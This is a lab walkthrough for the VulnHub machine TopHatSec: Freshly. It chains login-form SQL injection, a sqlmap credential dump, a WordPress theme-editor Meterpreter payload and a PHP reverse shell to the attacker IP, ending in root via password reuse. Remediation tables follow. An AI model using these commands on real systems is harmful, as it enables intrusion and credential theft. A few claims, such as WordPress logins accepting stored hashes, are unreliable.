# TopHatSec: Freshly — Fresh SQLi, Fresh Shells

Dude, TopHatSec: Freshly is one of those machines that teaches SQL injection in the most satisfying way possible: dump credentials from a login form, use them against a CMS, inject a shell, and walk out as root. Three web ports, two databases, one clean chain. The "freshly" in the name is legit because every step feels fresh even though the techniques are classic. Big respect to TopHatSec for the clean design. gg.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | TopHatSec: Freshly |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tophatsec-freshly,118/ |
| **Techniques** | Nmap multi-port scan, Nikto web scan, sqlmap SQL injection dump, WordPress admin login, WordPress theme editor PHP injection, Meterpreter via msfvenom + Metasploit, password reuse privilege escalation via `su` |
| **CVEs** | CWE-89 (SQL Injection in login form — port 80), CWE-434 (Unrestricted PHP code injection via WordPress theme editor), CWE-522 (Insufficiently Protected Credentials — WordPress admin password reused as root) |
| **APT Groups** | APT41: uses SQL injection for initial credential access in web-facing applications, then pivots to CMS exploitation; FIN7: specifically exploits WordPress installations via admin credential access and code injection for persistent access |

---

## Attack Summary

```
nmap → ports 80, 443, 8080
  → port 80: login page vulnerable to SQL injection
  → sqlmap: dump wordpress8080 database → admin:admin_password
  → port 8080: WordPress installation
  → WordPress admin login with dumped credentials
  → Appearance > Theme Editor > 404.php → PHP Meterpreter payload
  → msfvenom: generate payload → msfconsole multi/handler
  → Meterpreter session as www-data
  → su - with WordPress admin password (reuse) → root
  → /root/flag.txt
```

---

## Methodology

1. Host discovery and multi-port scan
2. Nikto scan for web vulnerability fingerprinting
3. SQL injection identification and exploitation on port 80
4. Credential dump from wordpress8080 database
5. WordPress admin authentication on port 8080
6. Meterpreter payload injection via theme editor
7. Privilege escalation via WordPress admin password reuse

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.112

nmap -sV -sC -p- 192.168.1.112
nikto -h http://192.168.1.112
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd (custom login page)
443/tcp  open  https   Apache httpd
8080/tcp open  http    Apache httpd (WordPress)
```

Three web services. Port 80 is the injection target. Port 8080 is WordPress. Port 443 may be a redirect or additional content.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — SQL Injection Identification on Port 80

Browse to `http://192.168.1.112/`. A login form appears. Test for SQL injection:

```bash
# Manual test in the password field:
admin' OR 1=1-- -
' OR '1'='1
```

If the login succeeds with a SQLi payload, confirm injection and move to sqlmap:

```bash
# Capture the login request with Burp Suite and save to /tmp/request.txt
# Then:
sqlmap -r /tmp/request.txt --level=3 --risk=2 --dbs
```

Enumerate databases. Find: `wordpress8080` among the databases.

**Alternative (without Burp):**

```bash
sqlmap -u "http://192.168.1.112/" \
  --data="username=admin&password=test" \
  --level=3 \
  --risk=2 \
  --dbs
```

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

---

## Step 3 — Credential Dump via sqlmap

Dump the `wordpress8080` database:

```bash
sqlmap -u "http://192.168.1.112/" \
  --data="username=admin&password=test" \
  -D wordpress8080 \
  --tables

sqlmap -u "http://192.168.1.112/" \
  --data="username=admin&password=test" \
  -D wordpress8080 \
  -T wp_users \
  --dump
```

Recover WordPress admin credentials. The hash in wp_users may be a WordPress MD5 hash or plaintext depending on the WordPress version:

```bash
# If hashed (WordPress phpass):
hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt

# Or use the hash directly against wp-admin:
# WordPress login forms accept the hash if the DB stores it directly
```

**Real-world note:** SQL injection in login forms remains one of the most common critical findings in web assessments. The OWASP Top 10 has listed SQL injection as a top category consistently. FIN7 specifically targets CMS login pages as initial credential access vectors.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1552.001 — Credentials in Files

---

## Step 4 — WordPress Admin Login on Port 8080

Navigate to `http://192.168.1.112:8080/wp-admin/`. Log in with dumped credentials.

```bash
# Verify login:
curl -c /tmp/wp_cookies.txt -d "log=admin&pwd=<password>&wp-submit=Log+In" \
  http://192.168.1.112:8080/wp-login.php
```

Successful admin login. WordPress admin access equals server compromise.

**MITRE ATT&CK:** T1078 — Valid Accounts

---

## Step 5 — Meterpreter Payload via WordPress Theme Editor

Generate a PHP Meterpreter payload:

```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.x \
  LPORT=4444 \
  -f raw \
  -o /tmp/shell.php
```

In WordPress Admin: **Appearance > Theme Editor > 404.php**

Replace the 404.php content with the msfvenom payload. Save.

Start Metasploit handler:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.x
set LPORT 4444
run
```

Trigger the payload by browsing to a non-existent WordPress page:

```bash
curl http://192.168.1.112:8080/wp-content/themes/<theme>/404.php
# Or browse to any 404 URL on the WordPress site
```

Meterpreter session opens as `www-data`.

**Alternative:** Use a basic PHP reverse shell instead of Meterpreter:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.x/4444 0>&1'"); ?>
```

**MITRE ATT&CK:** T1505.003 — Web Shell; T1059.004 — Unix Shell

---

## Step 6 — Shell Stabilization

From Meterpreter, drop to a proper shell:

```bash
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Or if using a raw netcat shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg → Enter Enter
```

**MITRE ATT&CK:** T1059.004 — Unix Shell

---

## Step 7 — Privilege Escalation via Password Reuse

The WordPress admin password is the same as the root password. Try:

```bash
su -
# Enter the WordPress admin password

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

Password reuse between the WordPress admin account and the Linux root account is the escalation path. No CVE needed: just try the same password everywhere.

**Real-world note:** Password reuse between application accounts and system accounts is extremely common in real environments, especially on single-purpose servers where one admin manages everything. This is consistently one of the highest-impact findings in internal penetration tests.

**MITRE ATT&CK:** T1078.003 — Valid Accounts: Local Accounts; T1548.003 — Abuse Elevation Control: su

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| WordPress admin creds | (dumped via sqlmap) | wordpress8080 DB wp_users | WordPress admin login |
| Root password | same as WordPress admin | password reuse | su root |
| Root flag | flag.txt | /root/flag.txt | completion |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SQL injection in login form | Login form SQLi is consistently in OWASP Top 10; parameterized queries solve it completely | Use prepared statements for all SQL; never concatenate user input into queries |
| 2 | Cross-database credential dump (port 80 SQLi gives port 8080 WordPress creds) | SQL injection access can dump all databases on the server, not just the targeted one | Separate database accounts per application; use least-privilege DB users |
| 3 | WordPress theme editor as a webshell | Any WordPress admin can inject arbitrary PHP via the theme editor; this is a built-in RCE feature | `define('DISALLOW_FILE_EDIT', true);` in wp-config.php; disable theme editor |
| 4 | Password reuse between WordPress admin and root | Single-use system management creates credential chains that collapse security layers | Unique passwords per account; use a password manager; PAM for system accounts |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files (DB dump) | T1552.001 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Persistence | Persistence | Web Shell: Theme Injection | T1505.003 |
| Execution | Execution | Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Valid Accounts: Local Accounts | T1078.003 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: su | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Parameterize all SQL queries** — prepared statements for every login form; no string concatenation
2. **Use per-application database accounts** — WordPress should have its own DB user with access only to its own schema; not to `wordpress8080` and every other DB
3. **Disable WordPress theme/plugin file editor** — `define('DISALLOW_FILE_EDIT', true);` in wp-config.php
4. **Enforce unique passwords** — WordPress admin password must not equal any system account password; use a password manager
5. **Implement WordPress hardening** — rate limiting on wp-login.php; 2FA; fail2ban for brute-force protection
6. **Separate web and database servers** — run MySQL on a separate host accessible only from the web server

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all web-facing login forms for SQL injection |
| Protect | Access Control | Parameterized queries; per-app DB users; WordPress 2FA |
| Protect | Data Security | Unique passwords per account; secrets manager |
| Detect | Anomalies and Events | Alert on sqli patterns in web logs; WordPress admin login anomalies |
| Respond | Response Planning | Remove webshells; rotate all credentials; patch SQL injection |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-10 | Information Input Validation | Parameterized queries prevent SQL injection in all forms |
| AC-6 | Least Privilege | Per-application DB users; no WordPress admin = root password |
| IA-5 | Authenticator Management | Unique passwords per account; regular rotation |
| CM-7 | Least Functionality | Disable WordPress theme editor |
| AU-12 | Audit Record Generation | Log all WordPress admin actions and login attempts |

### CISA KEV

SQL injection in web login forms is a top-exploited vulnerability class per CISA KEV. Multiple CVEs in CISA's catalog describe SQL injection in web applications used as initial access vectors. The CISA 2022 Top Routinely Exploited Vulnerabilities guidance specifically highlights improper input validation as a persistent critical issue.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Situational Awareness (SITUATION) | Perform Logging | MIL2 |

### MITRE D3FEND

- **D3-IVA** — Input Validation (parameterized queries)
- **D3-ACH** — Application Configuration Hardening (disable WP editor; per-app DB users)
- **D3-OAM** — Operating System Administrative Management (unique system passwords)

---

## Final Thoughts

TopHatSec: Freshly is a clean, efficient machine. The SQLi-to-CMS-to-password-reuse chain is exactly the kind of attack path that appears in real small business and SME assessments constantly. No exotic techniques: just fundamentals executed well.

The freshest lesson here is that SQL injection on one service (port 80) compromises a completely different service (port 8080 WordPress) because both share the same database server. Attack surface is always bigger than it looks.

Thanks guys!! (❍ᴥ❍ʋ)
